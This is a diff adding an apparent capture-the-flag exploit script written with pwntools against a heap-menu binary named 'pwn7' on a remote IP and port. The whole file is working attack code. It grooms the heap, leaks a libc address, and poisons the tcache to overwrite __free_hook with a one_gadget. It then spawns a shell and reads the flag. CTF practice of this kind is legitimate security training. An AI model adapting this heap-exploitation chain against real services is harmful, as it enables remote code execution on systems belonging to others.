@@ -1,0 +1,70 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.log_level = 'debug'
+
+s      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r      = lambda numb=4096          :p.recv(numb)
+rl      = lambda                    :p.recvline()
+ru      = lambda delims,drop=False  :p.recvuntil(delims,drop)
+uu32    = lambda data               :u32(data.ljust(4, '\x00'))
+uu64    = lambda data               :u64(data.ljust(8, '\x00'))
+info    = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+irt     = lambda                    :p.interactive()
+
+context.binary = './pwn7'
+elf = ELF('./pwn7')
+p = remote('219.219.61.234','10050')
+libc = elf.libc
+
+def add(size,payload):
+	sla('> ','1')
+	sla('> ',str(size))
+	sa('> ',payload)
+
+def delete(idx):
+	sla('> ','2')
+	sla('> ',str(idx))
+
+def show(idx):
+	sla('> ','3')
+	sla('> ',str(idx))
+
+for i in range(10):
+	add(0x10,'aaa')
+for i in range(3,10):
+	delete(i)
+for i in range(3):
+	delete(i)
+for i in range(10):
+	add(0x10,'aaa') 
+for i in range(6):
+	delete(i)
+delete(8) 
+delete(7) 
+add(0xf8,'a1gx')
+delete(6) 
+delete(9)
+for i in range(8):
+	add(0x10,'aaa')
+show(0)
+libc_base = uu64(r(6)) - 96 - 0x3ebc40
+
+free_hook = libc_base + libc.sym['__free_hook']
+one_gadget = libc_base +0x4f365 
+add(0x10,'aaaa')
+delete(1)
+delete(0)
+delete(9)
+add(0x20,p64(free_hook))
+add(0x20,'aaaa')
+add(0x20,p64(one_gadget))
+delete(3)
+sl("cat flag")
+irt()
